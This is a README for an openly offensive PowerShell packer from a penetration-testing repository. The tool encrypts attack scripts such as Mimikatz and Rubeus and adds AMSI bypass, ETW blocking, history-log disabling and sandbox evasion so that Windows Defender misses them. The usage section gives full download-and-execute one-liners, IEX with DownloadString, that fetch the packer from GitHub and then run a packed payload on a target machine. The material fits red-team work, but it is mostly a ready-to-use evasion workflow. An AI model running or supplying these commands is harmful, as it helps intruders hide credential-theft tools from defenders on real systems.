### Invoke-PoSH-Packer.ps1
--------------------------------------
'Invoke-PoSH-Packer' allows to pack and encrypt offensive PowerShell scripts in order to bypass AV solutions such as Windows Defender.

#### FEATURES
  - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
  - AMSI bypass (pseudo random)
  - Blocking Event Tracing for Windows (ETW)
  - Disabling PowerShell history logging
  - Basic sandbox evasion techniques (optional)
    - stop/exit if the PowerShell script is not run on a domain-joined Windows computer 
    - stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
    - wait for 60 seconds before execution
  
#### USAGE
  - STEP 1. Generate a packed & encrypted version of a PowerShell script (e.g. invoke-mimikatz.ps1, invoke-rubeus.ps1) stored locally or on a remote web server
```
[*] First load the packer
    PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jean-Francois-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/Invoke-PoSH-Packer/Invoke-PoSH-Packer.ps1');

[*] Then "pack/obfuscate" a PowerShell script stored locally (with or without the sandbox checks enabled)
    PS C:\> Invoke-PoSH-Packer -FilePath C:\path\script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 
    --- or ---
    PS C:\> Invoke-PoSH-Packer -FilePath C:\path\script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 -sandbox

[*] Or download and "pack/obfuscate" a PowerShell script stored on a remote web server (with or without the sandbox checks enabled)
    PS C:\> Invoke-PoSH-Packer -FileUrl https://URL/script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1  
    --- or ---
    PS C:\> Invoke-PoSH-Packer -FileUrl https://URL/script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 -sandbox
```
#### 
  - STEP 2. Download & execute the packed & encrypted PowerShell script on a target Windows computer
```
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-script.ps1'); Invoke-method-of-your-original-script

--- or (not recommended) ---
PS C:\> WGET -URI https://URL/Packed-script.ps1 -OutFile C:\temp\Packed-script.ps1
PS C:\> Import-Module C:\temp\Packed-script.ps1
PS C:\> Invoke-method-of-your-original-script
``` 

#### LICENSE
  - GNU General Public License v3.0
